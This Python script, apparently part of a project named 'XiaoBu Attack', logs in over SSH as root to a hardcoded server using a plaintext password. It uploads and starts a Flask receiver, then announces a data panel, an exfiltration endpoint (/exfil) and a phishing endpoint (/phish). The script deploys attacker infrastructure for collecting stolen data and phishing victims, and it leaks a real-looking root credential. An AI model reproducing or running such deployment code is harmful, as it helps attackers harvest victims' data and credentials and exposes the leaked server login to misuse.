#!/usr/bin/env python3
"""XiaoBu Attack - 服务器自动部署脚本"""
import paramiko
import os
import sys
import time

HOST = "192.144.228.237"
USER = "root"
PASS = "Huang2005.99"
LOCAL_DIR = os.path.dirname(os.path.abspath(__file__))

print("=" * 50)
print("  XiaoBu Attack - 服务器部署")
print(f"  目标: {USER}@{HOST}")
print("=" * 50)

# Connect
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    client.connect(HOST, username=USER, password=PASS, timeout=15)
    print("[OK] SSH连接成功")
except Exception as e:
    print(f"[FAIL] SSH连接失败: {e}")
    sys.exit(1)

# Create remote directory
stdin, stdout, stderr = client.exec_command("mkdir -p /root/xiaobu_server/data")
stdout.channel.recv_exit_status()
print("[OK] 远程目录已创建")

# Upload receiver.py via SFTP
sftp = client.open_sftp()
try:
    sftp.put(
        os.path.join(LOCAL_DIR, "receiver.py"),
        "/root/xiaobu_server/receiver.py"
    )
    print("[OK] receiver.py 已上传")
finally:
    sftp.close()

# Check/install Flask
print("[*] 检查 Flask...")
stdin, stdout, stderr = client.exec_command("python3 -c 'import flask; print(flask.__version__)' 2>&1")
result = stdout.read().decode().strip()
if "No module" in result or result == "":
    print("[*] 安装 Flask...")
    stdin, stdout, stderr = client.exec_command("pip3 install flask 2>&1")
    out = stdout.read().decode()
    err = stderr.read().decode()
    print(f"    {out[-200:] if out else err[-200:]}")
    print("[OK] Flask 已安装")
else:
    print(f"[OK] Flask {result}")

# Kill existing receiver
print("[*] 停止旧进程...")
client.exec_command("pkill -f 'python3 receiver.py' 2>/dev/null")
time.sleep(1)
print("[OK] 旧进程已停止")

# Start server
print("[*] 启动接收服务器...")
stdin, stdout, stderr = client.exec_command(
    "cd /root/xiaobu_server && nohup python3 receiver.py > server.log 2>&1 & sleep 2; echo 'STARTED'"
)
stdout.channel.recv_exit_status()

# Verify
stdin, stdout, stderr = client.exec_command("curl -s http://localhost:8080/health 2>/dev/null")
health = stdout.read().decode().strip()
if "ok" in health.lower():
    print(f"[OK] 服务器运行正常: {health}")
else:
    print(f"[WARN] 健康检查异常: {health}")
    # Check logs
    stdin, stdout, stderr = client.exec_command("cat /root/xiaobu_server/server.log 2>/dev/null | tail -10")
    print(f"日志: {stdout.read().decode()}")

client.close()
print("=" * 50)
print("  DONE! 部署完成")
print(f"  数据面板: http://{HOST}:8080/")
print(f"  外泄端点: http://{HOST}:8080/exfil")
print(f"  钓鱼端点: http://{HOST}:8080/phish")
print("=" * 50)
